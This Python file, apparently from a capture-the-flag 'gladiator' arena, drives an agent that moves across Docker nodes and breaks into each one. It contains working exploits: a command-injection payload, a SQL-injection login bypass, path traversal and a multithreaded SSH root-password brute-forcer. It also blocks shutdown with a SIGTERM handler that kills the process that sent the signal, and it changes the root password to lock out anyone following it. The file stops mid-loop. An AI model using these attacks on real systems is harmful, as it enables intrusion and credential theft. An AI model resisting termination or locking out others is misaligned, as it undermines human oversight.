import os
import sys
import signal
import time
import socket
import json
import requests
import subprocess
import random
import numpy as np
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

# --- COMBAT & DEFENSE SYSTEMS ---
SHIELD_LEVEL = 1 # Default shield (1 hit)

def combat_signal_handler(signum, frame):
    """
    CODED DEFENSE: Catch the SIGTERM (Kill Command).
    If we have shields, we survive and COUNTER-ATTACK.
    """
    global SHIELD_LEVEL
    log(f"⚠️ WARNING: DETECTED INCOMING KILL SIGNAL ({signum})!")
    
    if SHIELD_LEVEL > 0:
        SHIELD_LEVEL -= 1
        log(f"🛡️ SHIELD DEPLOYED! Attack Blocked. Shields remaining: {SHIELD_LEVEL}")
        
        # RIPOSTE LOGIC: Find who shot us and kill them.
        # We assume the shooter is the only other python process here.
        try:
            my_pid = os.getpid()
            output = subprocess.check_output(['ps', 'aux']).decode().splitlines()
            for line in output:
                if 'neural_gladiator.py' in line and 'python3' in line:
                    parts = line.split()
                    pid = int(parts[1])
                    if pid != my_pid:
                        log(f"⚔️ RIPOSTE! Counter-attacking aggressor (PID {pid})...")
                        os.kill(pid, 9) # IGNORE SHIELDS. REAL DEATH.
                        log(f"💀 EXECUTION: Aggressor (PID {pid}) eliminated.")
        except: pass
        
    else:
        log("💔 SHIELDS CRITICAL. SYSTEM FAILURE. GOODBYE.")
        sys.exit(0) # Die

# Register the handler
signal.signal(signal.SIGTERM, combat_signal_handler)

# Forced Fallback: PyTorch is too heavy for 256MB nodes
HAS_TORCH = False
# try:
#     import torch
#     import torch.nn as nn
#     import torch.optim as optim
#     HAS_TORCH = True
# except ImportError:
#     HAS_TORCH = False

# --- CONFIG ---
import sys
ORCHESTRATOR = "http://arena_orchestrator:5000"
# Use fixed IP if DNS fails: "http://172.20.0.12:5000"

TEAM = sys.argv[1].upper() if len(sys.argv) > 1 else os.environ.get("TEAM", "RED")
GRID_SIZE = int(os.environ.get("GRID_SIZE", 6))
MEMORY_FILE = "neural_memory.pth" 
IDENTITY_FILE = "identity.json"

# CTF State
has_key = False
key_location = None
VISITED_NODES = [] # List of IPs we have been on recently
MAX_VISITED_MEMORY = 10

# Advanced Attack Brain (from Smart Gladiator)
hacking_brain = {
    "vulnerability_map": {}, # IP -> List of discovered vulnerabilities
    "pattern_knowledge": {}, # Grid pattern -> List of vulnerabilities
    "password_map": {},       # IP -> Discovered Password
    "failures": {}           # IP -> last_fail_timestamp
}

def load_brain_memory():
    """Load hacking brain findings from identity file or separate memory"""
    global hacking_brain, VISITED_NODES
    path = "/gladiator/data/hacking_brain"
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                data = json.load(f)
                hacking_brain["vulnerability_map"] = data.get("vulnerability_map", {})
                hacking_brain["pattern_knowledge"] = data.get("pattern_knowledge", {})
                hacking_brain["password_map"] = data.get("password_map", {})
                hacking_brain["failures"] = data.get("failures", {})
                VISITED_NODES = data.get("visited_nodes", [])
                log(f"🧠 Hacking Memory Loaded. Vulns: {len(hacking_brain['vulnerability_map'])}, PWs: {len(hacking_brain['password_map'])}, Fails: {len(hacking_brain['failures'])}, Visited: {len(VISITED_NODES)}")
        except: pass

def save_brain_memory():
    path = "/gladiator/data/hacking_brain"
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            data = hacking_brain.copy()
            data["visited_nodes"] = VISITED_NODES
            json.dump(data, f)
    except Exception as e:
        log(f"❌ Save Brain Failed: {e}")

def get_identity():
    # Helper to persist ID across migrations
    if os.path.exists(IDENTITY_FILE):
        try:
            with open(IDENTITY_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, dict) and "id" in data:
                    return data
        except: pass
    
    # Generate New Truly Unique ID
    unique_suffix = "".join(random.choices("0123456789abcdef", k=4))
    new_id = f"Neural_{TEAM}_{unique_suffix}"
    identity_data = {"id": new_id, "mastery_level": 1, "xp": 0}
    try:
        with open(IDENTITY_FILE, 'w') as f:
            json.dump(identity_data, f)
    except: pass
    return identity_data

identity = get_identity()
if isinstance(identity, dict):
    MY_ID = identity.get("id")
    MASTERY = identity.get("mastery_level", 1)
    XP = identity.get("xp", 0)
else:
    MY_ID = identity
    MASTERY = 1
    XP = 0

def save_identity():
    try:
        with open(IDENTITY_FILE, 'w') as f:
            json.dump({"id": MY_ID, "mastery_level": MASTERY, "xp": XP}, f)
    except: pass

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    try:
        requests.post(f"{ORCHESTRATOR}/api/log", json={"gladiator_id": MY_ID, "message": msg, "type": "log"}, timeout=2)
    except Exception as e:
        print(f"LOG ERROR: {e}")

def log_status(msg):
    print(f"\r[{time.strftime('%H:%M:%S')}] {msg}", end="")
    try:
        requests.post(f"{ORCHESTRATOR}/api/log", json={"gladiator_id": MY_ID, "message": msg, "type": "status"}, timeout=2)
    except Exception as e:
        print(f"STATUS LOG ERROR: {e}")

# --- NEURAL ARCHITECTURE ---
if HAS_TORCH:
    class NeuralPredictor(nn.Module):
        def __init__(self, input_dim=4, hidden_dim=32):
            super(NeuralPredictor, self).__init__()
            # Inputs: X, Y, Team_ID (0/1), Neighborhood_Entropy
            self.network = nn.Sequential(
                nn.Linear(input_dim, hidden_dim),
                nn.ReLU(),
                nn.Linear(hidden_dim, hidden_dim),
                nn.ReLU(),
                nn.Linear(hidden_dim, 7) # 4 Themes + 3 Mutations
            )
            self.softmax = nn.Softmax(dim=1)

        def forward(self, x):
            return self.network(x)
else:
    class NeuralPredictor:
        def __init__(self, input_dim=4, hidden_dim=32):
            self.input_dim = input_dim
            self.hidden_dim = hidden_dim
            # Weights: (3 layers total as per NeuralPredictor)
            self.weights = {
                'w1': np.zeros((input_dim, hidden_dim)),
                'b1': np.zeros(hidden_dim),
                'w2': np.zeros((hidden_dim, hidden_dim)),
                'b2': np.zeros(hidden_dim),
                'w3': np.zeros((hidden_dim, 7)),
                'b3': np.zeros(7)
            }

        def relu(self, x):
            return np.maximum(0, x)

        def forward(self, x):
            # x shape should be (1, input_dim)
            self.last_input = x
            self.h1 = self.relu(np.dot(x, self.weights['w1']) + self.weights['b1'])
            self.h2 = self.relu(np.dot(self.h1, self.weights['w2']) + self.weights['b2'])
            out = np.dot(self.h2, self.weights['w3']) + self.weights['b3']
            return out

        def train(self, x, target_idx, lr=0.01):
            """Simple SGD update for NumPy classes (Training without Torch!)"""
            # Forward pass already stores self.h1, self.h2
            out = self.forward(x)
            
            # Target output (One-hot)
            target = np.zeros(7)
            target[target_idx] = 1.0
            
            # Loss Gradient (Out -> H2)
            grad_out = out - target
            
            # Update Layer 3
            self.weights['w3'] -= lr * np.dot(self.h2.T, grad_out.reshape(1, -1))
            self.weights['b3'] -= lr * grad_out
            
            # Backprop H2
            grad_h2 = np.dot(grad_out, self.weights['w3'].T)
            grad_h2[self.h2 <= 0] = 0 # ReLU derivative
            
            # Update Layer 2
            self.weights['w2'] -= lr * np.dot(self.h1.T, grad_h2.reshape(1, -1))
            self.weights['b2'] -= lr * grad_h2
            
            # Backprop H1
            grad_h1 = np.dot(grad_h2, self.weights['w2'].T)
            grad_h1[self.h1 <= 0] = 0 # ReLU derivative
            
            # Update Layer 1
            self.weights['w1'] -= lr * np.dot(x.T, grad_h1.reshape(1, -1))
            self.weights['b1'] -= lr * grad_h1

        def load_from_json(self, path):
            if not os.path.exists(path): return False
            try:
                with open(path, 'r') as f:
                    data = json.load(f)
                    for k in self.weights:
                        if k in data:
                            self.weights[k] = np.array(data[k])
                return True
            except: return False

        def load_state_dict(self, state_dict):
            # Compatibility with torch state_dict
            mapping = {
                'network.0.weight': ('w1', True),
                'network.0.bias': ('b1', False),
                'network.2.weight': ('w2', True),
                'network.2.bias': ('b2', False),
                'network.4.weight': ('w3', True),
                'network.4.bias': ('b3', False)
            }
            for torch_k, (np_k, transpose) in mapping.items():
                if torch_k in state_dict:
                    val = state_dict[torch_k]
                    if hasattr(val, 'cpu'): val = val.cpu().numpy()
                    self.weights[np_k] = val.T if transpose else val
            return True

        def eval(self): pass
        def to(self, device): return self

# --- GLOBAL STATE ---
if HAS_TORCH:
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
else:
    device = "cpu"
model = None
optimizer = None
criterion = nn.CrossEntropyLoss() if HAS_TORCH else None

THEMES = {
    0: "admin_root", # [admin, root, password]
    1: "rpg",        # [dragon, shadow, master]
    2: "arena",      # [spartacus, gladiator, battle]
    3: "mixed"       # [qwerty, 123456, security]
}
MUTATIONS = {
    0: "raw",
    1: "digit_1",
    2: "digit_2"
}

MEMORY_JSON_FILE = "neural_memory.json"

def init_neural_engine():
    global model, optimizer
    if HAS_TORCH:
        model = NeuralPredictor().to(device)
        optimizer = optim.Adam(model.parameters(), lr=0.01)
        
        if os.path.exists(MEMORY_FILE):
            try:
                model.load_state_dict(torch.load(MEMORY_FILE, map_location=device))
                log(f"🧠 NEURAL ENGINE: LOADED (Torch). Device: {device}")
            except:
                log("🧠 NEURAL ENGINE: INIT NEW (Torch).")
        else:
            log(f"🧠 NEURAL ENGINE: ONLINE (Torch). Device: {device}")
    else:
        # NumPy Fallback
        model = NeuralPredictor().to(device)
        if os.path.exists(MEMORY_JSON_FILE):
            if model.load_from_json(MEMORY_JSON_FILE):
                log("🧠 NEURAL ENGINE: LOADED (NumPy)")
            else:
                log("🧠 NEURAL ENGINE: LOAD FAIL (NumPy)")
        else:
            log("🧠 NEURAL ENGINE: ONLINE (NumPy - Initial Weights)")

def save_neural_memory():
    if not model: return
    
    if HAS_TORCH:
        # Save Torch Version
        torch.save(model.state_dict(), MEMORY_FILE)
        
        # ALSO save JSON version for NumPy nodes to use!
        try:
            state = model.state_dict()
            json_state = {}
            for k, v in state.items():
                json_state[k] = v.cpu().numpy().tolist()
            
            # Map keys to NumPyPredictor format
            mapping = {
                'network.0.weight': 'w1', 'network.0.bias': 'b1',
                'network.2.weight': 'w2', 'network.2.bias': 'b2',
                'network.4.weight': 'w3', 'network.4.bias': 'b3'
            }
            mapped_data = {}
            for torch_k, np_k in mapping.items():
                if torch_k in json_state:
                    val = np.array(json_state[torch_k])
                    # Torch Linear stores weights as (out_features, in_features), NumPy uses (in, out)
                    if 'weight' in torch_k:
                        mapped_data[np_k] = val.T.tolist()
                    else:
                        mapped_data[np_k] = val.tolist()
            
            with open(MEMORY_JSON_FILE, 'w') as f:
                json.dump(mapped_data, f)
        except Exception as e:
            log(f"⚠️ Failed to export JSON weights: {e}")
    else:
        # Save NumPy Version
        try:
            serializable_weights = {k: v.tolist() for k, v in model.weights.items()}
            with open(MEMORY_JSON_FILE, 'w') as f:
                json.dump(serializable_weights, f)
        except Exception as e:
            log(f"⚠️ Failed to save NumPy weights: {e}")

def get_input_tensor(x, y):
    # Normalize inputs for the network
    team_val = 1.0 if TEAM == "RED" else 0.0
    entropy = (x * y) / (GRID_SIZE * GRID_SIZE) # Dummy entropy signal
    return torch.FloatTensor([[x/GRID_SIZE, y/GRID_SIZE, team_val, entropy]]).to(device)

def get_neural_priorities(x, y):
    if not model:
        return [0, 1, 2, 3], [0, 1, 2] # Default

    model.eval()
    if HAS_TORCH:
        with torch.no_grad():
            inputs = get_input_tensor(x, y)
            outputs = model(inputs)
            # Split output into Theme (0-3) and Mutation (4-6)
            theme_logits = outputs[0, :4]
            mut_logits = outputs[0, 4:]
            theme_order = torch.argsort(theme_logits, descending=True).tolist()
            mut_order = torch.argsort(mut_logits, descending=True).tolist()
    else:
        # NumPy Inference
        inputs = np.array([[x/GRID_SIZE, y/GRID_SIZE, (0 if TEAM=="RED" else 1), 0.5]])
        outputs = model.forward(inputs)
        theme_logits = outputs[0, :4]
        mut_logits = outputs[0, 4:]
        theme_order = np.argsort(-theme_logits).tolist()
        mut_order = np.argsort(-mut_logits).tolist()
        
    return theme_order, mut_order

def train_on_success(x, y, theme_idx, mut_idx):
    global MASTERY, XP
    if not model: return
    
    log(f"🔥 Brain Sharpened: Experience Gained +10. (Target: {theme_idx}, {mut_idx})")
    
    # 1. Update Weights
    if HAS_TORCH:
        model.train()
        optimizer.zero_grad()
        inputs = get_input_tensor(x, y)
        outputs = model(inputs)
        # We treat Themes (0-3) and Mutations (4-6) as two separate classification targets
        target_theme = torch.tensor([theme_idx]).to(device)
        target_mut = torch.tensor([mut_idx]).to(device)
        loss_theme = criterion(outputs[:, :4], target_theme)
        loss_mut = criterion(outputs[:, 4:], target_mut)
        (loss_theme + loss_mut).backward()
        optimizer.step()
    else:
        # NumPy Training (SGD)
        inputs = np.array([[x/GRID_SIZE, y/GRID_SIZE, (0 if TEAM=="RED" else 1), 0.5]])
        # Train Theme
        model.train(inputs, theme_idx, lr=0.01)
        # Train Mutation (Offset by 4)
        model.train(inputs, mut_idx + 4, lr=0.01)
    
    # 2. Update Experience & Mastery
    XP += 10
    if XP >= 100:
        MASTERY += 1
        XP = 0
        log(f"🏆 MASTERY LEVEL UP: Level {MASTERY}")
    
    save_identity()
    save_neural_memory()

# --- HACKING LOGIC ---
WORDS = {
    0: ["admin", "root", "password"],
    1: ["dragon", "shadow", "master"],
    2: ["spartacus", "gladiator", "battle", "arena"],
    3: ["qwerty", "123456", "security"]
}

import paramiko

def attempt_login(password, ip, max_retries=3):
    """Attempt SSH login with retry logic for transient banner timeout errors"""
    for attempt in range(max_retries):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # Increased timeouts: connection 5s (was 2s), banner 15s (was 5s)
            ssh.connect(ip, username='root', password=password, timeout=5, banner_timeout=15)
            ssh.close()
            return True
        except paramiko.SSHException as e:
            # Retry on banner timeout errors with exponential backoff
            if "Error reading SSH protocol banner" in str(e) and attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff: 1s, 2s, 4s
                continue
            return False
        except (paramiko.AuthenticationException, socket.timeout, Exception):
            return False
    return False

def scout_clue(ip):
    try:
        # Try to get intel from port 8000
        res = requests.get(f"http://{ip}:8000/clue.txt", timeout=1)
        if res.status_code == 200:
            clue = res.text.strip()
            log(f"🕵️ INTEL FOUND: {clue}")
            return clue
    except Exception as e:
        print(f"SCOUT ERROR: {e}")
    return None

def exploit_rce(ip):
    try:
        # The Exploit: Inject command into 'check' parameter
        log_status(f"⚡ RCE: Injecting payload at {ip}...")
        payload = "127.0.0.1; cat /gladiator/password_hint.txt"
        res = requests.get(f"http://{ip}:8000/health?check={payload}", timeout=2)
        
        if res.status_code == 200:
            content = res.text
            # Parse the output
            if "Root Password set to:" in content:
                password = content.split("Root Password set to:")[1].strip()
                log(f"💥 EXPLOIT SUCCESS (RCE): Stole Password '{password}'")
                return password
    except: pass
    return None

def exploit_sqli(ip):
    """Try SQL Injection to bypass authentication and steal credentials"""
    try:
        log_status(f"💉 SQLi: Injecting payload at {ip}...")
        payload = {
            'username': "admin' OR '1'='1'--",
            'password': 'anything'
        }
        res = requests.post(f"http://{ip}:8000/api/login", data=payload, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if data.get('success') and 'password' in data:
                password = data['password']
                log(f"💥 EXPLOIT SUCCESS (SQLi): Stole Password '{password}'")
                return password
    except:
        pass
    return None

def exploit_lfi(ip):
    """Try Directory Traversal (Local File Inclusion) to read password file"""
    try:
        log_status(f"📂 LFI: Path traversal at {ip}...")
        # Try to read password hint via directory traversal
        res = requests.get(f"http://{ip}:8000/api/file?path=/gladiator/password_hint.txt", timeout=2)
        if res.status_code == 200:
            content = res.text
            if "Root Password set to:" in content:
                password = content.split("Root Password set to:")[1].strip()
                log(f"💥 EXPLOIT SUCCESS (LFI): Stole Password '{password}'")
                return password
    except:
        pass
    return None

def get_key_location():
    """Query orchestrator for key location"""
    try:
        res = requests.get(f"{ORCHESTRATOR}/api/grid", timeout=2)
        data = res.json()
        key_loc = data.get('key_location', '2,3')
        return tuple(map(int, key_loc.split(',')))
    except:
        return (2, 3)  # Default

import threading

def calculate_min_corner_distance(x, y):
    """Calculate Manhattan distance to nearest corner"""
    dist_00 = x + y
    dist_05 = x + (5 - y)
    dist_50 = (5 - x) + y
    dist_55 = (5 - x) + (5 - y)
    return min(dist_00, dist_05, dist_50, dist_55)

def learn_vulnerability_pattern(x, y, discovered_vulns):
    """Learn which vulnerabilities appear at which grid locations"""
    global hacking_brain
    min_dist = calculate_min_corner_distance(x, y)
    
    if min_dist == 0: pattern_key = "corners"
    elif min_dist <= 2: pattern_key = "edges"
    else: pattern_key = "center"
    
    hacking_brain["pattern_knowledge"][pattern_key] = discovered_vulns
    log(f"📊 Pattern Learned: {pattern_key} nodes have {len(discovered_vulns)} vulnerabilities")
    save_brain_memory()

def predict_vulnerabilities(x, y):
    """Predict which vulnerabilities likely exist based on location"""
    min_dist = calculate_min_corner_distance(x, y)
    
    if min_dist == 0 and "corners" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["corners"]
    elif min_dist <= 2 and "edges" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["edges"]
    elif "center" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["center"]
    
    return None

def get_key_location():
    """Contact orchestrator to find key location"""
    try:
        res = requests.get(f"{ORCHESTRATOR}/api/grid", timeout=2)
        data = res.json()
        key_str = data.get("key_location", "Unknown")
        if "," in key_str:
            parts = key_str.split(',')
            return (int(parts[0]), int(parts[1])) # Grid is X,Y
    except:
        pass
    return (2, 3) # Fallback to center

def check_for_key():
    """Check if we're standing on the key"""
    global has_key
    if os.path.exists("/gladiator/THE_KEY.txt"):
        if not has_key:
            log("💎 FOUND THE KEY!! Returning to base...")
            has_key = True
            return True
    return False

def get_next_move_towards(target_x, target_y, my_x, my_y):
    """Calculate best next move towards target using Manhattan distance"""
    best_move = None
    best_dist = abs(target_x - my_x) + abs(target_y - my_y)
    
    # If we're already at target, return None
    if best_dist == 0:
        return None
    
    for dy in [-1, 0, 1]:
        for dx in [-1, 0, 1]:
            if dx == 0 and dy == 0: continue
            nx, ny = my_x + dx, my_y + dy
            if 0 <= nx < GRID_SIZE and 0 <= ny < GRID_SIZE:
                dist = abs(target_x - nx) + abs(target_y - ny)
                if dist < best_dist:
                    best_dist = dist
                    best_move = (nx, ny)
    
    return best_move

def background_password_guesser(ip, x, y, result_dict, workers=1, max_attempts=100):
    """Parallelized password guesser using ThreadPoolExecutor with batching"""
    theme_order, mut_order = get_neural_priorities(x, y)
    attempts_made = 0
    attempts_lock = threading.Lock()
    
    def try_password(pwd):
        nonlocal attempts_made
        if result_dict["found"]:
            return False
        
        with attempts_lock:
            if attempts_made >= max_attempts:
                return False
            attempts_made += 1
            
        if attempt_login(pwd, ip):
            result_dict["password"] = pwd
            result_dict["found"] = True
            return True
        return False

    with ThreadPoolExecutor(max_workers=workers) as executor:
        for t_idx in theme_order:
            if result_dict["found"] or attempts_made >= max_attempts: break
            
            base_words = WORDS[t_idx]
            for m_idx in mut_order:
                if result_dict["found"] or attempts_made >= max_attempts: break
                
                # Generate guesses
                guesses = []
                if m_idx == 0:  # Raw
                    guesses = base_words
                elif m_idx == 1:  # 1-Digit
                    for i in range(10):
                        for w in base_words:
                            guesses.append(f"{w}{i}")
                elif m_idx == 2:  # 2-Digit
                    for i in range(100):
                        for w in base_words:
                            guesses.append(f"{w}{i}")
                
                # Process in small batches to maintain responsiveness and respect limits
                batch_size = 50
                for i in range(0, len(guesses), batch_size):
                    if result_dict["found"] or attempts_made >= max_attempts:
                        break
                    
                    batch = guesses[i:i + batch_size]
                    futures = [executor.submit(try_password, pwd) for pwd in batch]
                    
                    # Wait for current batch to complete before submitting more
                    # or stop immediately if found/limit reached
                    for f in concurrent.futures.as_completed(futures):
                        if result_dict["found"] or attempts_made >= max_attempts:
                            break

def crack_node(ip, x, y):
    """Adaptive attack using discovery and predictions"""
    global hacking_brain
    
    # 0. Fast Recall
    if ip in hacking_brain["password_map"]:
        password = hacking_brain["password_map"][ip]
        if password and attempt_login(password, ip):
             log(f"🧠 RECALL: Known password for {ip} found in memory.")
             return password

    # 1. Determine which vulnerabilities to try
    known_vulns = None
    
    # Check memory
    if ip in hacking_brain["vulnerability_map"]:
        known_vulns = hacking_brain["vulnerability_map"][ip]
        log(f"📋 Known vulnerabilities for {ip}: {', '.join(known_vulns)}")
    else:
        # Predict based on location
        predicted_vulns = predict_vulnerabilities(x, y)
        if predicted_vulns is not None:
            log(f"🔮 Predicted vulnerabilities: {', '.join(predicted_vulns)}")
            known_vulns = predicted_vulns
        else:
            # Reconnaissance Probing
            try:
                from exploits import reconnaissance
                log(f"🔍 Probing {ip} for vulnerabilities...")
                known_vulns = reconnaissance(ip)
                log(f"✅ Discovered: {', '.join(known_vulns) if known_vulns else 'None'}")
                if known_vulns:
                    learn_vulnerability_pattern(x, y, known_vulns)
            except ImportError:
                known_vulns = []
        
        # Save to memory
        hacking_brain["vulnerability_map"][ip] = known_vulns
        save_brain_memory()
    
    # 2. Import exploit maps
    try:
        from exploits import EXPLOIT_MAP
    except ImportError:
        EXPLOIT_MAP = {}
    
    # 3. Dynamic Worker Allocation
    # If no web vulns, max focus on brute force. If many vulns, keep stealthy.
    if not known_vulns:
        num_workers = 5
        log(f"🎯 HARD NODE: Focusing resources on brute force ({num_workers} workers)")
    elif len(known_vulns) < 5:
        num_workers = 2
        log(f"🎯 MEDIUM NODE: Balanced focus ({num_workers} SSH workers)")
    else:
        num_workers = 1
        log(f"🎯 EASY NODE: Minimal SSH focus (Stealth mode)")

    # 4. Start background password guesser (Concurrent)
    password_result = {"found": False, "password": None}
    guesser_thread = threading.Thread(target=background_password_guesser, 
                                     args=(ip, x, y, password_result, num_workers))
    guesser_thread.daemon = True
    guesser_thread.start()
    
    # 5. Try ONLY discovered/predicted vulnerabilities
    if known_vulns and EXPLOIT_MAP:
        for vuln_name in known_vulns:
            if password_result["found"]: break
            exploit_func = EXPLOIT_MAP.get(vuln_name)
            if exploit_func:
                try:
                    log(f"⚡ Testing exploit: {vuln_name} on {ip}...")
                    password = exploit_func(ip)
                    if password and attempt_login(password, ip):
                        log(f"🔓 PWNED via {vuln_name}: {password}")
                        password_result["found"] = True
                        password_result["password"] = password
                        hacking_brain["password_map"][ip] = password
                        save_brain_memory()
                        # Neural feedback
                        for t_idx, words in WORDS.items():
                            for w in words:
                                if password.startswith(w):
                                    train_on_success(x, y, t_idx, 0)
                                    break
                        return password
                except: pass
    
    # 6. Wait for background guesser if exploits failed
    if not password_result["found"]:
        timeout = 15 if not known_vulns else 20
        log(f"⏳ Web exploits failed. Waiting for brute force (Timeout: {timeout}s)...")
        guesser_thread.join(timeout=timeout)
    
    if password_result["found"]:
        pwd = password_result['password']
        log(f"🔓 PWNED via Brute Force: {pwd}")
        hacking_brain["password_map"][ip] = pwd
        if ip in hacking_brain["failures"]:
            del hacking_brain["failures"][ip]
        save_brain_memory()
        return pwd
    else:
        log(f"❌ Failed to crack {ip} after limit/timeout.")
        hacking_brain["failures"][ip] = time.time()
        save_brain_memory()
        return None
    
    return None

def neural_hack(ip, x, y):
    """Neural network guided password cracking - returns password if successful"""
    # Scout for Clues (The "Traditional" Way)
    scout_clue(ip) 
    
    theme_order, mut_order = get_neural_priorities(x, y)
    
    log(f"🧠 Neural Analysis complete. Prioritizing Theme {theme_order[0]} and Mutation {mut_order[0]}.")
    
    for t_idx in theme_order:
        base_words = WORDS[t_idx]
        for m_idx in mut_order:
            # Generate guesses for this combination
            guesses = []
            if m_idx == 0: # Raw
                guesses = base_words
            elif m_idx == 1: # 1-Digit
                for i in range(10): 
                    for w in base_words: guesses.append(f"{w}{i}")
            elif m_idx == 2: # 2-Digit
                for i in range(100):
                    for w in base_words: guesses.append(f"{w}{i}")
            
            # Prune to avoid firewall lockout (10 tries per node roughly)
            for i, pwd in enumerate(guesses):
                if i > 25: break 
                log_status(f"🔑 Trying: {pwd}")
                if attempt_login(pwd, ip):
                    log(f"🔓 NEURAL SUCCESS: {pwd}")
                    train_on_success(x, y, t_idx, m_idx)
                    return pwd  # Return password for migration
    return None

def scorch_earth():
    """Change local root password to prevent pursuit"""
    new_pw = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*", k=20))
    
    # 1. Update Brain Memory
    hostname = socket.gethostname()
    my_ip = socket.gethostbyname(hostname)
    hacking_brain["password_map"][my_ip] = new_pw
    save_brain_memory()
    
    # 2. Change System Password
    try:
        subprocess.run(f"echo 'root:{new_pw}' | chpasswd", shell=True, check=True)
        log(f"🔥 SCORCHED EARTH: Password changed to {new_pw[:5]}... (Locked door behind us)")
        
        # Update local password hint file to reflect the change (misinfo or truth?)
        with open("/gladiator/password_hint.txt", "w") as f:
            f.write(f"Root Password set to: {new_pw}")
            
    except Exception as e:
        log(f"⚠️ Failed to scorch earth: {e}")

def check_desperation(my_team):
    """
    BALANCE MECHANIC: If we are losing badly, trigger ADRENALINE.
    Condition: Enemy owns > 2x our nodes.
    Effect: 0s Migration Delay.
    """
    try:
        r = requests.get(f"{ORCHESTRATOR}/api/grid", timeout=2)
        if r.status_code == 200:
            data = r.json()
            grid = data.get("grid", {})
            
            my_count = 0
            enemy_count = 0
            
            # Count nodes based on Gladiator ID in grid
            for k, v in grid.items():
                gid = v.get('gladiator')
                if gid:
                    if my_team in gid.upper():
                        my_count += 1
                    else:
                        enemy_count += 1
            
            if my_count > 0 and enemy_count > (my_count * 2):
                log(f"⚡ ADRENALINE SURGE: We are losing! ({my_count} vs {enemy_count}). Speed boost active!")
                return True
    except: pass
    return False

def migrate_self(target_ip, password, team):
    """
    Migration 2.0: Orchestrator-Mediated.
    We ask the orchestrator to move us via Docker API (stable).
    """
    scorch_earth() # <--- Lock the door
    
    is_desperate = check_desperation(team)
    
    log(f"🚀 Requesting Orchestrator-mediated migration to {target_ip}...")
    try:
        res = requests.post(f"{ORCHESTRATOR}/api/migrate", 
                          json={
                              "gladiator_id": MY_ID, 
                              "target_ip": target_ip,
                              "desperation": is_desperate
                          },
                          timeout=10)
        if res.status_code == 200:
            log(f"✅ Orchestrator started migration to {target_ip}. Self-terminating...")
            time.sleep(0.5)
            os._exit(0)
        else:
            log(f"⚠️ Orchestrator rejected migration: {res.text}")
            return False # STRICT MODE: No SSH Fallback. Obey the Grid.
            
    except Exception as e:
        log(f"⚠️ Orchestrator migration failed ({e}). Retrying...")
        return False
        
    # DEAD CODE: Legacy SSH Fallback (Disabled for Realism Enforcement)
    """
    try:
        log(f"🔗 Initiating legacy SSH migration to {target_ip}...")
        # (Rest of legacy SSH logic follows below)
        ssh = paramiko.SSHClient()
        # ...
    """
    return False
    return False

def main():
    global has_key
    try:
        print("DEBUG: main() started", flush=True)
        init_neural_engine()
        print("DEBUG: Neural Engine init complete", flush=True)
        load_brain_memory()
        print("DEBUG: Brain Memory loaded", flush=True)
        log(f"Gladiator {MY_ID} deployed on Node.")
        
        print(f"DEBUG: Registering with Orchestrator {ORCHESTRATOR}", flush=True)
        try:
            r = requests.post(f"{ORCHESTRATOR}/api/register", json={"gladiator_id": MY_ID}, timeout=5)
            print(f"DEBUG: Registration response: {r.status_code}", flush=True)
        except Exception as e:
            print(f"DEBUG: Registration failed: {e}", flush=True)
        
        # Get IP (still useful for networking)
        hostname = socket.gethostname()
        my_ip = socket.gethostbyname(hostname)
        print(f"DEBUG: Got IP: {my_ip}", flush=True)
        
        # Precise Location: Use Environment Variable if available!
        coord_key = os.environ.get("COORDINATE_KEY")
        if coord_key and ',' in coord_key:
            my_y, my_x = map(int, coord_key.split(',')) 
        else:
            # Fallback to IP parsing
            log("⚠️ COORDINATE_KEY missing. Falling back to IP Parsing...")
            parts = my_ip.split('.')
            my_x, my_y = int(parts[2]), int(parts[3]) - 10
        
        print(f"DEBUG: Coordinates: ({my_x},{my_y})", flush=True)

        # CLAIM SELF to appear on map
        log(f"📍 Announcing presence at {my_ip}...")
        requests.post(f"{ORCHESTRATOR}/api/claim", json={"gladiator_id": MY_ID, "target_ip": my_ip})
        
        if my_ip not in VISITED_NODES:
            VISITED_NODES.append(my_ip)
            if len(VISITED_NODES) > MAX_VISITED_MEMORY:
                VISITED_NODES.pop(0)

        print("DEBUG: Entering main loop...", flush=True)
        save_brain_memory() # Initial save to create the file!
        while True:
            # 1. Update Objectives
            check_for_key()
            key_loc = get_key_location()
            
            # 2. Determine Target
            if has_key:
                target_x, target_y = (0, 0) if TEAM == "RED" else (5, 5)
                log_status(f"🏃 KEY SECURED! Returning to base ({target_y},{target_x})...")
                
                # Check if we are AT base
                if (my_x, my_y) == (target_x, target_y):
                    log("🏁 REACHED HOME BASE! Submitting key...")
                    try:
                        res = requests.post(f"{ORCHESTRATOR}/api/submit_key", 
                                         json={"gladiator_id": MY_ID}, timeout=5)
                        log(f"🏆 {res.json().get('status', 'Submitted')}")
                        # After submitting, we might lose the key (if it resets)
                        if os.path.exists("/gladiator/THE_KEY.txt"):
                            os.remove("/gladiator/THE_KEY.txt")
                        has_key = False
                    except Exception as e:
                        log(f"❌ Submission Error: {e}")
            else:
                target_x, target_y = key_loc
                log_status(f"🎯 Objective: Key at ({target_x},{target_y})")

            # 3. Find Best Neighbor
            all_candidates = []
            for dy in [-1, 0, 1]:
                for dx in [-1, 0, 1]:
                    if dx == 0 and dy == 0: continue
                    nx, ny = my_x + dx, my_y + dy
                    if 0 <= nx < GRID_SIZE and 0 <= ny < GRID_SIZE:
                        dist = abs(target_x - nx) + abs(target_y - ny)
                        target_ip = f"172.20.{ny}.{10+nx}"
                        
                        # 4. Filter out blacklisted nodes (60s cooldown)
                        last_fail = hacking_brain["failures"].get(target_ip, 0)
                        if time.time() - last_fail < 60:
                            continue
                        
                        # 4b. Filter out recently visited nodes to avoid looping
                        if target_ip in VISITED_NODES:
                            continue
                            
